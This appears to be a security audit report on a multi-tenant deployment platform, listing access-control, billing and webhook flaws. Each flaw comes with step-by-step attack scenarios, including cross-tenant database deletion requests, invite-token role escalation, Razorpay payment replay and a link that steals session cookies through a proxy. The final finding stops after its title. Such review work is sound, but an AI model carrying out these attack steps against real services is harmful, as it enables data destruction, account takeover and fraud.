findings.title: GET/DELETE /api/gcp/discover lets any authenticated user delete another tenant's Cloud SQL / Memorystore / Firestore instance
findings.failure_scenario: All tenants' managed databases live in ONE shared GCP project (config.gcp.projectId, see src/lib/gcp/cloudsql.ts:846 `const gcpProjectId = projectId || config.gcp.projectId`). Instance names have no tenant prefix — src/app/api/projects/[id]/storage/route.ts:112 sets `resourceName = name.toLowerCase().replace(/\s+/g, '-')`, i.e. literally the connector name the user typed ("prod-db", "main-postgres"). Attacker signs up, creates their own throwaway project P (they are automatically `owner`, so the role gate at line 88 passes), then issues `GET /api/gcp/discover?projectId=P` which returns every Cloud SQL / Redis / Firestore resource in the shared GCP project (src/lib/gcp/discovery.ts:85-107 lists `projects/${targetProjectId}/instances` unfiltered). They pick a victim instance id from that list and send `DELETE /api/gcp/discover?projectId=P&resourceId=<victim-instance>&resourceType=cloud-sql`. The handler never checks that `resourceId` corresponds to any storageConfig of project P — it goes straight to the Cloud SQL Admin API DELETE.
findings.impact: Permanent, irreversible destruction of any other customer's production database (Cloud SQL instance, Redis instance, or Firestore database) by any user who can create a single project. Total cross-tenant data loss and platform-wide availability compromise.
findings.checked_mitigations: Read the whole route end-to-end: the only authorization is `checkProjectAccess(session.user.id, projectId)` on the *caller's own* projectId (line 83) plus an owner/admin role gate (line 88). Grepped the file for `resourceName`, `storageConfigs`, `access.project` — the resource is never matched against `access.project.storageConfigs`. Checked src/proxy.ts (edge layer) — it only does rate limiting, security headers and subdomain routing, no authorization. Checked src/lib/gcp/cloudsql.ts:841-861 deleteInstance — no ownership check, and MOCK_DB short-circuit only applies in mock mode. Compared with the sibling clone route (src/app/api/projects/[id]/storage/[storageId]/clone/route.ts:36-48) which DOES re-check access on the second resource, proving the pattern is known to the codebase and simply omitted here.

findings.title: GET /api/gcp/discover enumerates every tenant's database instances in the shared GCP project
findings.failure_scenario: `discoverResources` (src/lib/gcp/discovery.ts:85-107) calls `https://sqladmin.googleapis.com/v1/projects/${targetProjectId}/instances` with the platform service-account token and pushes EVERY returned item into the response, with no filter tying results to the Deployify project passed in. Because every tenant's Cloud SQL/Memorystore/Firestore resource is provisioned into the same GCP project, an attacker who creates one project of their own and calls `GET /api/gcp/discover?projectId=<their project>` receives the instance name, region, state, databaseVersion and `connectionName` of every other customer's database. The optional `gcpProjectId` query param additionally lets the caller aim the platform SA at any GCP project it can read.
findings.impact: Cross-tenant infrastructure inventory disclosure: customer names leak through instance names (they are the user-supplied connector name slugified), plus regions, engine versions and Cloud SQL connectionNames. It is also the reconnaissance step that makes the DELETE finding above trivially targetable instead of requiring guesswork.
findings.checked_mitigations: Read src/lib/gcp/discovery.ts lines 18-140: the `deployifyProjectId` argument is used only to fetch external provider API keys, never to filter the GCP result set; `activeBranchPatterns` only sets an `isOrphaned` flag, it does not exclude anything. Grepped the route for any post-filter on `resources` — there is none, the array is returned verbatim at line 48-51. The `access.role === 'viewer'` gate at line 30 does not help: the attacker is owner of their own project.

findings.title: /api/infrastructure/health and /api/infrastructure/compliance-report accept an arbitrary teamId with no membership check
findings.failure_scenario: Any authenticated Deployify user sends `GET /api/infrastructure/health?teamId=<victim team id>`. `listProjectsByTeam` (src/lib/db.ts:1078-1094) is a raw Firestore `where('teamId','==',teamId)` query with no caller scoping, so the response body returns the victim organisation's `projectHealth` map (project ids), and `regionalMappings[]` containing projectId, projectName, projectRegion, storageId, storageName, storageType and storageRegion for every connector they own, plus their aggregate cost, forecast and security-risk breakdown. The identical omission exists at src/app/api/infrastructure/compliance-report/route.ts:23, whose response is richer still: per-connector `connectorId`, `connectorName`, `type`, `environment`, security `score`, `grade`, and the full `risks` array from `checkSecurityPosture`.
findings.impact: Cross-tenant disclosure of another organisation's full infrastructure inventory, monthly spend, and — via the compliance report — an itemised list of their unremediated security weaknesses (a ready-made attack plan against their databases).
findings.checked_mitigations: Both handlers were read end-to-end; neither imports nor calls `getTeamMembership`, `listTeamsForUser`, or `checkProjectAccess` (the health route's imports at line 3 are only `listProjectsByUser, listProjectsByTeam`). This is provably an omission rather than a design choice: the sibling POST /api/infrastructure/remediate/route.ts:26-31 performs exactly the missing check with the comment `// Security: Verify user is a member of the team`, and GET /api/projects/route.ts:29-39 does the same before calling `listProjectsByTeam`. src/proxy.ts adds no authorization.

findings.title: Public dashboard-widget query path never binds the widget to the storageId in the URL, nor restricts caller-supplied query variables
findings.failure_scenario: The widget document stores its own `storageId` (written at src/app/api/projects/[id]/storage/dashboards/route.ts:87) but the handler resolves the connector from the URL segment instead, and never compares the two. (1) Cross-connector: a project publishes widget W on its staging connector and a second public widget on its production connector — both storageIds are readable unauthenticated via GET /api/projects/[id]/storage/dashboards/[dashboardId]. An unauthenticated attacker POSTs `{"widgetId":"W"}` to `/api/projects/<id>/storage/<PRODUCTION-storageId>/query`, and W's saved query (e.g. `SELECT * FROM users LIMIT 500`) executes against the production database. (2) Variable tampering, no guessing required: line 28 destructures `variables` from the request body and lines 91-133 substitute them into the query on the public path too. A widget whose saved query is `SELECT * FROM invoices WHERE customer_id = :cid` becomes an arbitrary-row reader for any unauthenticated visitor who posts a different `cid`.
findings.impact: Unauthenticated read of live customer database rows from connectors that were never shared publicly, and unauthenticated horizontal traversal of every row reachable by a published widget's parameterised query.
findings.checked_mitigations: Checked the masking mitigation: `shouldMask = widgetId || access?.role === 'viewer'` (line 943) routes public results through `maskData` — but src/lib/utils/masking.ts only regex-redacts emails, phones, credit-card digits, SSNs and `*_token/_key/_secret` keys; all other columns (names, addresses, amounts, free text, internal ids, health data) are returned verbatim. Confirmed the read-only keyword filter at line 136-140 blocks writes but not reads. Confirmed no `widgetData.storageId === storageId` comparison exists anywhere in the file (grepped `widgetId` — hits only at 28, 35, 38, 943, 984, 1033). Confirmed the share page src/app/share/dashboard/[id]/page.tsx:79 supplies `widget.storageId` from the client, so the server is fully trusting a client-controlled path segment.

findings.title: Team invite tokens are readable by every member including viewers, and /api/invites/accept never binds the token to the invited email — viewer to owner escalation
findings.failure_scenario: Step 1 — token disclosure: `GET /api/teams/[id]/invites` (src/app/api/teams/[id]/invites/route.ts:23-31) gates only on `getTeamMembership(id, session.user.id)` being non-null, so a `viewer` passes. It returns `listInvitesForTeam(id)`, which spreads the raw Firestore document (`return { ...data, createdAt, expiresAt } as TeamInvite`, src/lib/db.ts:661-666) — and `TeamInvite` includes `token: string` (src/types/index.ts:107). Step 2 — redemption: the attacker POSTs that token to /api/invites/accept. The handler compares nothing against `session.user.email`, and `acceptInvite` (src/lib/db.ts:718-749) unconditionally writes `{ teamId: invite.teamId, userId, role: invite.role }`. A viewer who sees a pending `owner` or `admin` invite addressed to someone else redeems it and is granted that role. `acceptInvite` also never checks for an existing membership, so it leaves the attacker with two membership rows for the same team.
findings.impact: A read-only team member escalates to team owner/admin, gaining project deletion, credential rotation, secret reveal, member removal and billing control over the whole team; the legitimate invitee's invite is consumed and deleted, and the duplicate membership row makes the escalation hard to spot in the members list.
findings.checked_mitigations: Read src/app/api/invites/accept/route.ts end-to-end — no `session.user.email` reference at all (grepped). Read src/lib/db.ts:718-749 `acceptInvite` — no email comparison, no existing-membership guard, no role clamp. Confirmed the invites listing has no role gate, unlike its siblings: src/app/api/teams/[id]/invite/route.ts:39 and src/app/api/teams/[id]/invites/[inviteId]/route.ts:24 both require `owner`/`admin`. Confirmed the token is high-entropy (`crypto.randomUUID()`, invite/route.ts:64) so guessing is not the vector — authenticated disclosure via the listing endpoint is.

findings.title: Cloud SQL backup restore, regional migration and schema migrations have no role gate — a viewer can overwrite production data
findings.failure_scenario: A user holding the lowest role (`viewer`) on a team project — someone deliberately given read-only access, e.g. a contractor or auditor — POSTs to `/api/projects/<id>/storage/<storageId>/backups/<backupId>/restore`. `checkProjectAccess` returns `{allowed:true, role:'viewer'}` and the handler proceeds directly to `restoreBackup`, which issues a Cloud SQL `restoreBackup` call (src/lib/gcp/cloudsql.ts:402-416) that overwrites the live production instance with the backup's contents, discarding every write since that backup. Sending `backupId=pitr` with an arbitrary `pointInTime` body field does the same via point-in-time recovery. The same missing gate lets a viewer POST /migrate-region (src/app/api/projects/[id]/storage/[storageId]/migrate-region/route.ts:22-30, spins up a new instance and flips the connector to `provisioning`) and POST /migrations and /migrations/rollback (which run Prisma migrations against the production database).
findings.impact: Destructive, hard-to-reverse data loss on a customer's production database triggered by a principal the customer explicitly restricted to read-only, plus unbudgeted infrastructure spend from viewer-initiated regional migrations.
findings.checked_mitigations: Grepped the restore, migrate-region, migrations and migrations/rollback route files for `access.role` / `role ===` — zero hits in any of them. This is inconsistent enforcement rather than an intentional model: eleven sibling storage routes explicitly reject viewers with the identical guard, e.g. src/app/api/projects/[id]/storage/[storageId]/rotate/route.ts:29, .../export/route.ts:30, .../import/route.ts:30, .../clone/route.ts:27, .../cutover/route.ts:23, and .../replica/promote/route.ts:27 requires owner/admin. Verified `checkProjectAccess` (src/middleware/rbac.ts) returns `allowed:true` for every membership row regardless of role, so it provides no implicit gate. src/proxy.ts adds none.

findings.title: Production traffic rollback and Cloud Run alias retargeting are open to viewers
findings.failure_scenario: A `viewer` on a team project POSTs to `/api/projects/<id>/deployments/<any old ready deployId>/rollback`. The only gate is `checkProjectAccess`, which returns allowed for viewers, so `updateTraffic` shifts 100% of the production Cloud Run service to a stale revision — reverting the live site to old code, potentially reintroducing a patched vulnerability. The same gap exists at src/app/api/projects/[id]/rollback/route.ts:26-33 (POST with an arbitrary `revisionName`) and at src/app/api/projects/[id]/deployments/[deployId]/alias/route.ts:24 / :97, where POST and DELETE let a viewer create or tear down Cloud Run traffic tags and, via `removeAliasFromOtherDeployments`, steal an alias such as `staging` or `canary` from the deployment that currently owns it.
findings.impact: A read-only principal can cause a production outage or silently roll back a security fix, and can hijack or delete named preview aliases — all while the audit log records the action as an ordinary rollback rather than a privilege violation.
findings.checked_mitigations: Read all three route files end-to-end; grepped each for `role` — no occurrences. Confirmed these routes DO correctly bind the nested resource (`targetDeployment.projectId !== id` at line 31, and the same check in alias/route.ts:33 and :106), so the defect is specifically the missing role tier, not an IDOR. Confirmed the codebase treats deploy-class actions as viewer-forbidden elsewhere: src/app/api/projects/[id]/deploy/route.ts:44 and :321 both return 403 for `access.role === 'viewer'`, and src/app/api/projects/[id]/domains/route.ts:100 requires owner/admin — a rollback is a strictly more dangerous production mutation than a deploy.

findings.title: Any project member, including viewers, can flip a dashboard widget to isPublic and expose live database query results to the internet
findings.failure_scenario: A `viewer` (or any `member`) on a project PATCHes `/api/projects/<id>/storage/dashboards/<dashboardId>` with `{"isPublic": true}`. No role check runs. `isPublic` is the sole authorization gate on two unauthenticated endpoints: the widget metadata GET in this same file (lines 41-51 skip `getSession`/`checkProjectAccess` entirely when `widget.isPublic`) and the public query path at src/app/api/projects/[id]/storage/[storageId]/query/route.ts:45-50. Once flipped, anyone with the widget id can retrieve the widget's `query` and `storageId` and execute that query against the live production connector with no session, refreshed on the widget's `refreshInterval`. The same route's DELETE (line 143) likewise lets a viewer permanently delete any of the team's dashboards.
findings.impact: A read-only or low-trust team member converts an internal dashboard into a permanent unauthenticated data feed out of the production database, and can destroy other members' dashboards. Combined with the query-route binding gap above, the published widget also becomes a pivot to other connectors in the project.
findings.checked_mitigations: Read the file end-to-end; grepped for `role` — no occurrences in PATCH, DELETE or POST (src/app/api/projects/[id]/storage/dashboards/route.ts:69-93 also has no role gate on creation, so a viewer can create a public widget outright). Confirmed `checkProjectAccess` (src/middleware/rbac.ts) returns `allowed:true` for a viewer membership. Confirmed the unauthenticated read paths really are gated only on this boolean by reading dashboards/[dashboardId]/route.ts:41-51 and query/route.ts:35-50. Compared with src/app/api/projects/[id]/env/[envId]/reveal/route.ts:29, which blocks viewers from a far less consequential disclosure.

result.coverage_notes:
Swept all 86 route handlers under src/app/api (find src/app/api -name route.ts) and built a full auth/authz matrix by grepping each for getSession/requireAuth, checkProjectAccess, getTeamMembership, and any access.role inspection, then read every route that scored a gap end-to-end.

Confirmed-clean areas (checked and deliberately NOT reported):
- Nested deployment resources: all three /deployments/[deployId]/* routes correctly enforce `deployment.projectId !== id` (alias:33 & :106, logs:33, rollback:31). No deployId IDOR.
- storageId as a nested resource is structurally safe: storageConfigs are an array embedded in the project document, so `access.project.storageConfigs.find(s => s.id === storageId)` cannot cross tenants. Verified in src/lib/db.ts (only storageId references are 134-183 in cloneStorageConfig).
- Saved queries bind to the caller: queries/[queryId]/route.ts:38 and :84 both check `doc.data()?.userId !== session.user.id`.
- Billing invoice download binds correctly (billing/invoices/[id]/download/route.ts:31 `invoice.userId !== session.user.id`).
- Team member management is thoroughly guarded: teams/[id]/members/[userId]/route.ts enforces owner/admin, admins-cannot-touch-owners, only-owners-promote-to-owner, and last-owner protection (lines 25, 45, 53, 115, 132, 140). teams/[id]/invites/[inviteId]/route.ts:40 verifies `invite.teamId !== teamId`.
- Storage clone already fixed the target-project BOLA (clone/route.ts:36-48, including a viewer check on the target).
- GET /api/projects:29-39 and POST /api/infrastructure/remediate:26-31 both verify team membership before listProjectsByTeam — these are the correct-pattern references I used to prove the infrastructure/health and compliance-report omissions are bugs, not design.
- /api/cron/optimize:37-42 fails closed in production (returns 401 when CRON_SECRET is unset or mismatched unless NODE_ENV!=='production' AND MOCK_DB==='true'), so I did not report it.
- Deliberately excluded as refutable: the `process.env.MOCK_DB === 'true'` authorization short-circuits in restore/route.ts:22, migrations/route.ts:23, migrations/rollback/route.ts:26, query/route.ts:53 and the dashboards routes. They bypass checkProjectAccess entirely, but only when an env var no production deployment sets is enabled, so they are a test-hook code smell rather than an exploitable finding.
- Also excluded: v1/analytics/[id]/realtime:23 uses `project.userId === session.user.id` in addition to team membership, so a project's original creator keeps access after transfer to a team — a divergence from checkProjectAccess semantics, but too weak/theoretical to report.

Not covered (out of scope for this dimension or not reachable by static review): SQL/NoSQL injection in the query proxy's non-SQL variable substitution path (query/route.ts:123-132 does raw string replacement for Mongo/Redis — flagged here only as a pointer for the injection reviewer), the public analytics ingest /api/v1/collect, /api/v1/proxy/[slug], /api/webhooks/github signature verification, /api/billing/webhook signature verification, and crypto/secret-management correctness in src/lib/crypto.ts. Firestore security rules were not reviewed (all access here is via firebase-admin, which bypasses rules, so server-side checks are the only control).

findings.title: Payment verification grants a client-chosen subscription tier; the Razorpay signature only covers orderId|paymentId, not the tier or amount
findings.failure_scenario: A logged-in user POSTs /api/billing/checkout {tierId:'pro'} and is charged the Pro price of INR 1,500 (src/lib/billing/tiers.ts:45). Razorpay returns razorpay_order_id / razorpay_payment_id / razorpay_signature to the browser. Instead of letting the page handler run (src/app/billing/page.tsx:135-146), the user replays those three values to /api/billing/verify by hand with {"tierId":"enterprise"}. verifyPaymentSignature HMACs only `orderId + '|' + paymentId`, so the signature still validates, and the route writes tier:'enterprise' verbatim. Nothing in the route reads the order back from Razorpay, compares the captured amount to TIERS['enterprise'].price (INR 15,000), or checks the tierId recorded in the server-created order's notes.
findings.impact: Any paying customer obtains the Enterprise tier for the price of the cheapest paid tier — 10x revenue loss per account, plus TIERS.enterprise grants Infinity projects / deployments / buildMinutes / bandwidth (src/lib/billing/tiers.ts:70-75), which is the only server-side quota gate on platform-funded Cloud Build and Cloud Run spend.
findings.checked_mitigations: Read the entire 72-line verify route: it calls getSession() (auth present) but performs no gateway-side order lookup. Grepped for razorpay order fetch helpers — src/lib/billing/payments.ts exports only getRazorpay/createOrder/verifyPaymentSignature/verifyWebhookSignature; there is no orders.fetch call anywhere in src/. Grepped `TIERS[` and `tier.price` — the price is only consulted in checkout, never in verify. Confirmed src/app/billing/page.tsx:144 passes tierId 'from closure', i.e. purely client state.

findings.title: Payment verification has no idempotency ledger and never binds the payment to the session user, so one purchase can upgrade unlimited accounts unlimited times
findings.failure_scenario: User A pays once and captures the triple (razorpay_order_id, razorpay_payment_id, razorpay_signature) from their own browser devtools. The route never checks (a) that the order's notes.userId equals session.user.id — the order notes {userId, tierId} set at src/app/api/billing/checkout/route.ts:81 are never read back, and (b) that this paymentId has not already been redeemed — no payments/redemptions collection is written or queried. User A posts the same triple from account B, C, D…: every one of them is upgraded. A can also re-post it from their own account every month to mint a fresh 30-day currentPeriodEnd. Grepped Collections for a payments ledger: src/lib/firebase.ts Collections has no payments/redemptions entry, and the INVOICES collection is never written (see the dead-invoice finding).
findings.impact: A single INR 1,500 charge can be resold to an unbounded number of accounts, and any leaked/logged payment triple (support ticket, browser history, client-side error report) is a permanent free-upgrade token. Combined with the tier-escalation defect above, one INR 1,500 payment provisions unlimited Enterprise accounts.
findings.checked_mitigations: Read the full verify route — no dedupe, no order-ownership check. Grepped `createInvoiceRecord|Collections.INVOICES|razorpaySubscriptionId` across src/: razorpaySubscriptionId is only written, never queried; no uniqueness index. Checked src/proxy.ts:46-49 strictRateLimitRoutes — only '/api/auth/' and '/api/webhooks/' get the 30/min cap, so /api/billing/verify runs at 100/min per IP+path from an in-memory per-instance Map (src/proxy.ts:21), which does not stop replay.

findings.title: Paid subscriptions never expire and cancellation is ignored: writers set currentPeriodEnd but the only expiry check reads subscription.expiresAt, which nothing ever writes
findings.failure_scenario: Both writers of the subscription object — src/app/api/billing/verify/route.ts:43 and src/app/api/billing/webhook/route.ts:47 — set `currentPeriodEnd: new Date(Date.now() + 30*24*60*60*1000)` and never set `expiresAt`. `grep -rn "expiresAt" src/` shows the field is only ever *read* (src/lib/db.ts:40, 867, 924, 964 and tiers.ts:115) — no code path assigns subscription.expiresAt. So the guard at tiers.ts:115 is dead: after a single one-time INR 1,500 Razorpay order (checkout creates a one-off order via createOrder, not a Razorpay recurring subscription), the user holds Pro forever. caps.getUserTier — the tier used by the only server-side quota gate at src/app/api/projects/[id]/deploy/route.ts:54 — ignores expiry and `status` entirely, so even subscription.status === 'canceled' or 'unpaid' still returns the paid tier.
findings.impact: Every paid plan is effectively a one-time lifetime purchase: month 2 onward is 100% revenue loss, and there is no way to downgrade a delinquent or cancelled account — the quota gate keeps honoring the paid limits against platform-funded Cloud Build/Cloud Run spend.
findings.checked_mitigations: Grepped `currentPeriodEnd|expiresAt` across all of src/ — the two billing writers are the only producers of currentPeriodEnd and there is no consumer of it. Grepped for a renewal/downgrade cron: src/app/api/cron/ contains only `optimize`, which touches storageConfigs and never reads user.subscription. Confirmed the User type declares both fields (src/types/index.ts:46,48), so this is a field-name mismatch, not a missing type.

findings.title: GitHub-webhook deployments bypass the usage-cap gate entirely; caps are only enforced on the manual /deploy route
findings.failure_scenario: A free-tier account (TIERS.free = 20 deployments/mo, 100 build minutes/mo, src/lib/billing/tiers.ts:34-39) connects a repo and simply pushes commits instead of clicking Deploy. Each push reaches handlePushEvent, which goes createDeployment -> generateCloudRunDeployConfig -> submitCloudBuild with no call to checkUsageLimits. The same hole exists in handlePullRequestEvent (line 520 createDeployment, line 590 submitCloudBuild). Because a `pull_request` `opened`/`synchronize` build is triggered by *anyone on the internet* who opens a PR against a connected public repo, an unauthenticated third party can submit unbounded Cloud Build jobs against the project — each one pulling the project's preview env vars and runtimeSecrets via getEnvVarsForDeployment(project,'preview',...) at line 547 and the decrypted owner GitHub token at line 559.
findings.impact: Tier quotas are unenforceable through the primary deployment path — a free account can consume unlimited platform-funded Cloud Build minutes, Artifact Registry storage and Cloud Run revisions. With the PR path this is remotely reachable by an unauthenticated attacker, making it a direct cost-amplification/DoS vector against the platform's GCP bill.
findings.checked_mitigations: `grep -rn "checkUsageLimits|calculateTierLimits|getUserTierLimits|getUserTier\b" src/` returns exactly two consumers outside src/lib/billing: src/app/api/projects/[id]/deploy/route.ts:54 and src/app/api/billing/usage/route.ts:29 (read-only display). Read createDeployment (src/lib/db.ts:1147-1163) and submitCloudBuild — neither consults limits. The proxy rate limit (src/proxy.ts:46-49, 30/min for '/api/webhooks/') keys on `${ip}:${pathname}` from GitHub's rotating delivery IPs in a per-instance in-memory Map, so it neither identifies the user nor enforces a billing quota.

findings.title: Repo-to-project binding is by non-unique repoFullName resolved with limit(1), and project creation only requires read access to the repo
findings.failure_scenario: Attacker POSTs /api/projects {repoFullName:'victim-org/public-app'}. getRepo is octokit repos.get (src/lib/github.ts:88), which succeeds for any public repo with any GitHub token — there is no ownership/admin assertion. createRepoWebhook then fails with 404/403 and the failure is swallowed, so the project is created anyway. Nothing enforces uniqueness on repoFullName (no such index or pre-check exists in createProject, src/lib/db.ts:978-999). Now two project documents share repoFullName='victim-org/public-app'. Both webhook handlers resolve the project with getProjectByRepoFullName(repository.full_name) (route.ts:92 and :232), and a Firestore equality query with no orderBy returns results ordered by __name__ ascending — document ids are `proj_` + Math.random base36 (src/lib/utils.ts:20-24), so the attacker deletes and recreates until their id sorts below the victim's. From then on every genuine, correctly-signed push from the victim's repo is routed into the attacker's project: it builds with the attacker's env vars, deploys to the attacker's Cloud Run service, and the buildId/logUrl land in the attacker's deployment record — while the victim's own pipeline silently stops firing.
findings.impact: Silent takeover of another tenant's CD pipeline for any public repo: victim's deployments stop with no error (handlePushEvent just returns), the attacker receives their commits' build output and controls the served revision, and PR-closed events let the attacker's storageConfigs drive deleteService/deleteSqlDatabase/dropDatabase against attacker-chosen resources on victim-triggered events.
findings.checked_mitigations: Grepped every use of repoFullName in src/lib/db.ts — the only query is the limit(1) equality lookup; no uniqueness constraint, no userId or teamId predicate in the webhook lookup. Read the full project POST handler: the only authorization is getSession() plus optional team membership; there is no check of repoData.permissions.admin or repoData.owner. Confirmed the webhook handlers do not re-check ownership after resolving the project (route.ts:92-101 and :232-244 go straight to getUserById(project.userId)).

findings.title: Razorpay webhook is verified with the API key secret; no dedicated webhook secret exists, so payment.captured is either unverifiable-by-design or silently dropped
findings.failure_scenario: Razorpay signs X-Razorpay-Signature with the per-webhook secret configured in the dashboard, which is a distinct value from RAZORPAY_KEY_SECRET. There is no RAZORPAY_WEBHOOK_SECRET in src/lib/config.ts and none in env.example (grepped: env.example lines 57-59 define only RAZORPAY_KEY_ID and RAZORPAY_KEY_SECRET). Two outcomes, both bad: (a) the operator leaves the dashboard webhook secret at its own value, so every payment.captured delivery fails the HMAC and returns 400 — a customer whose browser closes, crashes, or loses network between the Razorpay modal succeeding and the /api/billing/verify POST is charged and never provisioned, with zero reconciliation path since the webhook is the only out-of-band provisioning route; or (b) the operator sets the dashboard webhook secret equal to RAZORPAY_KEY_SECRET to make it work, which turns the live API credential into an HMAC key transmitted-over and validated-against every inbound webhook, and any HMAC oracle or config leak now costs the full payment API key rather than a rotatable webhook secret.
findings.impact: In case (a) paid-but-unprovisioned customers are systematically produced with no automated remediation (a support-and-chargeback generator); in case (b) the highest-value payment credential is reused as a webhook HMAC key, collapsing the blast radius separation the gateway provides.
findings.checked_mitigations: Grepped `RAZORPAY` across src/ and env.example — only KEY_ID and KEY_SECRET exist; no webhook-secret variable is defined or read anywhere. Read src/lib/billing/payments.ts:69-83 in full: verifyWebhookSignature fails closed on an undefined secret (returns false), so this is not a signature-bypass — the defect is the conflated secret and the resulting silent-drop failure mode. Confirmed the webhook is the only provisioning path other than the browser-driven /api/billing/verify call at src/app/billing/page.tsx:137.

findings.title: Checkout charges the tier price with no tax and the entire invoice pipeline is dead code, so no GST is collected and no invoice record is ever created
findings.failure_scenario: An Indian customer upgrades to Pro. checkout creates a Razorpay order for exactly 150000 paise (INR 1,500) — calculateTax is never invoked, so the 18% GST the code models is never added to the charge. After Razorpay captures, neither /api/billing/verify nor /api/billing/webhook calls generateInvoiceData or createInvoiceRecord: `grep -rn "createInvoiceRecord|generateInvoiceData" src/` matches only src/lib/billing/invoices.ts itself and invoices.test.ts. The Collections.INVOICES collection therefore stays empty forever, so listInvoicesForUser (src/lib/billing/invoices.ts:261) always returns [] and GET /api/billing/invoices always renders an empty billing history, while the /api/billing/invoices/[id]/download PDF generator is unreachable.
findings.impact: 18% GST is under-collected on every Indian transaction — an unrecoverable liability the platform must absorb out of already-received revenue — and no tax invoice or payment record is ever persisted, so there is no financial audit trail tying any Razorpay capture to a user and nothing to reconcile chargebacks or the paid-but-unprovisioned cases against.
findings.checked_mitigations: Grepped calculateTax callers: only generateInvoiceData (src/lib/billing/invoices.ts:233), which itself has no callers outside its test. Read both provisioning writers (verify route lines 38-63, webhook route lines 30-56) end-to-end — neither creates an invoice or applies tax. Confirmed Collections.INVOICES is only read (listInvoicesForUser, getInvoiceById) and written by the uncalled createInvoiceRecord. Verified the invoice download route itself is correctly authorized (ownership check at src/app/api/billing/invoices/[id]/download/route.ts:31), so this is a missing-writer defect, not an access-control one.

result.coverage_notes:
Swept and read end-to-end: src/app/api/webhooks/github/route.ts (624 lines), src/app/api/billing/{webhook,verify,checkout,usage}/route.ts, src/app/api/billing/invoices/route.ts + [id]/download/route.ts, src/lib/billing/{payments,pricing,pricing-utils,tiers,caps,tracker,tax,invoices}.ts, src/lib/security/index.ts, src/lib/webhooks.ts, src/app/api/cron/optimize/route.ts, src/lib/config.ts, env.example, src/proxy.ts (routing/rate-limit/auth), src/app/billing/page.tsx (client checkout flow), plus the corroborating paths src/app/api/projects/route.ts (POST), src/app/api/projects/[id]/route.ts (PATCH allowlist), src/app/api/projects/[id]/deploy/route.ts, src/lib/db.ts (getProjectByRepoFullName, createProject, createDeployment, updateUser), src/lib/github.ts (getRepo, createRepoWebhook), src/lib/gcp/cloudbuild.ts (build-config generation), src/lib/utils.ts (generateId, shouldAutoDeploy), src/types/index.ts (User.subscription).

Candidates I examined and deliberately REJECTED as non-findings:
- verifyGitHubWebhookSignature with an unset GITHUB_WEBHOOK_SECRET: crypto.createHmac('sha256', undefined) throws at src/lib/security/index.ts:62-65, which is OUTSIDE the try block at :67, so it propagates to the route's catch and returns 500. Fails closed, no bypass.
- timingSafeEqual on unequal-length buffers (security/index.ts:69-72): throws, caught, returns false. Correct fail-closed behavior.
- verifyWebhookSignature / verifyPaymentSignature using `===` instead of timingSafeEqual: non-constant-time, but a remote timing attack on a 64-char hex HMAC over HTTP is not practically exploitable. Stylistic.
- /api/cron/optimize auth (route.ts:37-42): the `NODE_ENV === 'production' || MOCK_DB !== 'true'` disjunction means a production deployment always 401s on a missing or wrong CRON_SECRET. The bypass only opens with NODE_ENV!=='production' AND MOCK_DB==='true', i.e. local dev. Not exploitable in production.
- Razorpay webhook trusting payment.notes.userId/tierId: the order notes are set server-side at checkout/route.ts:81. Whether Razorpay Checkout's client-side `notes` option can override the order's notes on the payment entity is gateway-specific and I could not confirm it from this repo, so I did not report it. Worth a targeted check against Razorpay docs — if client notes do win, it is a second independent tier-escalation path with no amount validation in the webhook.
- SSRF via project.webhookUrl -> sendWebhookNotification (src/lib/webhooks.ts:12): webhookUrl is in the PATCH allowlist (src/app/api/projects/[id]/route.ts:136) with no scheme/host validation, giving a blind outbound POST from the platform's GCP workload. Response body is never returned to the user and the GCP metadata server requires a Metadata-Flavor header, so I judged it below the bar here — flagging it for whoever owns the SSRF dimension.
- Decrypted GitHub token interpolated in plaintext into a Cloud Build step arg (src/lib/gcp/cloudbuild.ts:505: `git clone https://x-access-token:${gitToken}@github.com/${repoFullName}`) instead of using Cloud Build availableSecrets. Real secret-hygiene defect, but exposure is confined to principals with cloudbuild.builds.get on the platform's own GCP project — off this dimension, flagging for the secrets/deployment reviewer.
- Command injection via commitSha/branch into that same bash -c string: both values originate from GitHub-signed webhook payloads or getBranchLatestCommit, so they are not attacker-controlled. `branch` only reaches Cloud Build `tags`, where a malformed value causes API rejection, not injection.

NOT covered (outside this dimension): src/app/api/v1/collect, src/app/api/v1/proxy/[slug], the storage/database connectors, auth/session issuance internals, and RBAC on non-billing routes.

findings.title: Public edge proxy forwards the caller's Cookie/Authorization headers verbatim to a tenant-controlled origin, leaking the httpOnly deployify_session JWT
findings.failure_scenario: The route is a normal App Router handler with no auth and no host restriction, so it is reachable directly on the dashboard apex, e.g. https://deployify.io/api/v1/proxy/<slug>/<path> (src/proxy.ts only *rewrites* subdomain traffic to it at line 108; it never blocks direct apex access). setSessionCookie() in src/lib/auth.ts:117-123 sets 'deployify_session' with no Domain attribute and sameSite:'lax', so it is a host-only cookie on the apex that IS attached to a top-level GET navigation to that apex URL. Attacker signs up, creates project 'evil', deploys an app whose handler logs every inbound header, then sends a victim a link to https://deployify.io/api/v1/proxy/evil/pwn. The victim's browser attaches deployify_session; the loop above copies 'cookie' (and 'authorization') into the outbound Headers and fetch() at line 164 sends them to the attacker's Cloud Run service, which logs the raw JWT.
findings.impact: Full account takeover of any logged-in Deployify user with one click, bypassing the httpOnly protection entirely. The JWT payload also carries the user's GitHub OAuth accessToken (createSessionToken in src/lib/auth.ts:29 embeds `accessToken`), so the attacker additionally obtains repo-scoped GitHub access for every victim.
findings.checked_mitigations: Read the whole route file: no getSession/requireAuth/checkProjectAccess import or call anywhere in src/app/api/v1/proxy/[slug]/[[...path]]/route.ts. Grepped `rg -n 'deployify_session' src/` - only auth.ts, proxy.ts and the CLI; nothing strips it before proxying. src/proxy.ts's auth gate only covers pathnames starting with /dashboard or /new (line 155), not /api/v1/proxy. The header skip-list is exactly ['host','connection'].

findings.title: Proxy follows redirects from the tenant app with attacker-supplied headers intact, giving full SSRF to the GCP metadata server
